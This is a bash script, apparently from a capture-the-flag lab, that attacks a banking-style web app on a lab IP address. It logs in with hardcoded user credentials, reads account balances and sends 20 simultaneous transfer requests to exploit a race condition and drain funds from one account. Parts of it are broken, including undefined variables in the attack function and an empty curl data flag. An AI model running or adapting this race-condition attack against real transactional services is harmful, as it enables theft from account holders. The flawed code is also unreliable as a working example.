#!/usr/bin/env bash

users=(4621 6282 9317)
passwords=('blueApple' 'whiteHorse' 'greenOrange')

url='http://10.10.210.97:5000'

dashboard="$url/dashboard"
login="$url/login"
transfer="$url/transfer"

scan()
{
        #curl -L $url -o 'home'
	login 4621 'blueApple'
	#curl -sL $dashboard --cookie cookie.txt -vvvv -O
	#curl -sL "$transfer/6282" --cookie cookie.txt -vvvv -O
}

get_balance()
{
        login $1 $2
        balance=$(curl -sL $dashboard --cookie cookie.txt --stderr - | grep -oP '\$[0-9]+')
        echo "User ($1): $balance"
}

login()
{
        username=$1
	password=$2

        authenticate=$(curl -sL $login --cookie-jar cookie.txt -d "username=$username" -d "password=$password")
}

show_balances()
{
	echo "BALANCES"
	for i in `seq 0 2`; do
		get_balance ${users[$i]} ${passwords[$i]}
	done
}

transfer()
{
	login $1 $2
	destination="$transfer/$3"
        response=$(curl -sL $destination --cookie cookie.txt -d )
	echo $response
}

attack()
{
        login $user_2
        for i in `seq 1 20`; do
                (transfer $user_2 $user_1 20) &
        done
}

scan
#show_balances

